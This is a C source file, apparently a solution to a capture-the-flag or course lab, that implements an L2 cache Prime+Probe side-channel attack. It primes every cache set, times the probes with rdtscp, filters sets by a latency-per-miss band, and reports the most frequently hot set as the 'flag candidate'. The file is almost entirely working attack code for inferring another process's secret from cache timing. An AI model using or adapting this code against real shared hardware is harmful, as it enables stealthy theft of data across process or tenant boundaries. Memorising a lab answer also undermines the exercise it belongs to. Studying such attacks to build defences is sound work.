#include "util.h"
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define LINE_SIZE 64
#define L2_SETS   1024
#define L2_WAYS   16
#define SET_SPAN  (L2_SETS * LINE_SIZE)
#define BUFF_SIZE (SET_SPAN * L2_WAYS)

#define REPORT_INTERVAL_CYCLES 600000000ULL
#define MISS_THRESHOLD_CYCLES  80ULL

// Victim sets consistently show avg_latency / miss_ways in [40, 100].
// Noise sets with miss_ways=1 and avg=800+ score ~800, well outside this band.
#define RATIO_MIN 40ULL
#define RATIO_MAX 100ULL

static inline uint64_t now_cycles(void)
{
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

static inline void prime_set(void *buf, int set)
{
    volatile char tmp;
    for (int k = 0; k < L2_WAYS; k++) {
        size_t off = (size_t)k * SET_SPAN + (size_t)set * LINE_SIZE;
        tmp = *((volatile char *)buf + off);
    }
    (void)tmp;
}

// Returns total latency across all ways; sets *miss_count_out to number of ways
// whose individual latency exceeded MISS_THRESHOLD_CYCLES.
static inline uint64_t probe_set(void *buf, int set, int *miss_count_out)
{
    uint64_t total = 0;
    int misses = 0;
    for (int k = 0; k < L2_WAYS; k++) {
        size_t off = (size_t)k * SET_SPAN + (size_t)set * LINE_SIZE;
        uint64_t t = measure_one_block_access_time((uint64_t)((char *)buf + off));
        total += t;
        if (t > MISS_THRESHOLD_CYCLES) misses++;
    }
    *miss_count_out = misses;
    return total;
}

int main(int argc, char **argv)
{
    void *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                     -1, 0);
    if (buf == (void *)-1) { perror("mmap"); exit(1); }

    for (size_t i = 0; i < BUFF_SIZE; i += LINE_SIZE)
        *((volatile char *)buf + i) = 1;

    printf("Buffer at %p. Press Enter to start probing...\n", buf);
    { char tmp[2]; fgets(tmp, sizeof(tmp), stdin); }

    uint64_t *accum        = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *count        = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *misses       = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *wins         = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *top20_appear = calloc(L2_SETS, sizeof(uint64_t));
    if (!accum || !count || !misses || !wins || !top20_appear) { perror("calloc"); exit(1); }

    uint64_t next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
    int epoch = 0;

    while (1) {
        for (int set = 0; set < L2_SETS; set++) {
            prime_set(buf, set);
            uint64_t wait = now_cycles() + 20000ULL;
            while (now_cycles() < wait) asm volatile("lfence" ::: "memory");

            int mc = 0;
            accum[set]  += probe_set(buf, set, &mc);
            misses[set] += (uint64_t)mc;
            count[set]++;
        }

        if (now_cycles() >= next_report) {
            epoch++;
            printf("\n=== Epoch %d — top 20 hottest sets ===\n", epoch);
            printf("%-6s  %-14s  %-12s  %-10s\n",
                   "set", "avg_probe_cyc", "miss_ways", "cyc/miss");

            int      top_sets[20];
            uint64_t top_avgs[20];
            uint64_t top_misses[20];
            uint64_t top_ratios[20];
            int top_n = 0;

            // Only consider sets whose avg_latency / miss_ways falls in [RATIO_MIN, RATIO_MAX].
            // Among qualifying sets, rank by avg latency.
            for (int rank = 0; rank < 20; rank++) {
                int best = -1;
                uint64_t best_avg = 0;
                for (int s = 0; s < L2_SETS; s++) {
                    if (count[s] == 0 || misses[s] == 0) continue;
                    uint64_t avg   = accum[s] / count[s];
                    uint64_t ratio = avg / misses[s];
                    if (ratio < RATIO_MIN || ratio > RATIO_MAX) continue;
                    if (avg > best_avg) { best_avg = avg; best = s; }
                }
                if (best < 0) break;
                top_sets[top_n]   = best;
                top_avgs[top_n]   = accum[best] / count[best];
                top_misses[top_n] = misses[best];
                top_ratios[top_n] = top_avgs[top_n] / misses[best];
                top_n++;
                printf("%-6d  %-14lu  %-12lu  %-10lu\n",
                       best, top_avgs[top_n-1], top_misses[top_n-1], top_ratios[top_n-1]);
                accum[best] = 0; count[best] = 0; // remove for next rank
            }

            // Epoch winner: set with most appearances in top 20 across all epochs.
            // Tiebreak by avg latency.
            int epoch_best_set       = -1;
            uint64_t epoch_best_hits = 0;
            uint64_t epoch_best_avg  = 0;
            uint64_t epoch_best_miss = 0;
            for (int i = 0; i < top_n; i++) {
                int s = top_sets[i];
                top20_appear[s]++;
                if (top20_appear[s] > epoch_best_hits ||
                    (top20_appear[s] == epoch_best_hits && top_avgs[i] > epoch_best_avg)) {
                    epoch_best_hits = top20_appear[s];
                    epoch_best_set  = s;
                    epoch_best_avg  = top_avgs[i];
                    epoch_best_miss = top_misses[i];
                }
            }

            if (epoch_best_set >= 0) {
                wins[epoch_best_set]++;
                int most_frequent_set = 0;
                uint64_t most_wins = wins[0];
                for (int s = 1; s < L2_SETS; s++) {
                    if (wins[s] > most_wins) {
                        most_wins = wins[s];
                        most_frequent_set = s;
                    }
                }
                printf("Epoch winner: set %d (top20_hits=%lu, avg=%lu, miss_ways=%lu, cyc/miss=%lu)\n",
                       epoch_best_set, epoch_best_hits, epoch_best_avg, epoch_best_miss,
                       epoch_best_miss > 0 ? epoch_best_avg / epoch_best_miss : 0);
                printf("Flag candidate (most frequent winner): set %d with %lu/%d epoch wins\n",
                       most_frequent_set, most_wins, epoch);
            } else {
                printf("Epoch winner: none qualified (no sets within ratio band [%llu, %llu])\n",
                       RATIO_MIN, RATIO_MAX);
            }

            memset(accum,  0, L2_SETS * sizeof(uint64_t));
            memset(count,  0, L2_SETS * sizeof(uint64_t));
            memset(misses, 0, L2_SETS * sizeof(uint64_t));
            fflush(stdout);
            next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
        }
    }

    return 0;
}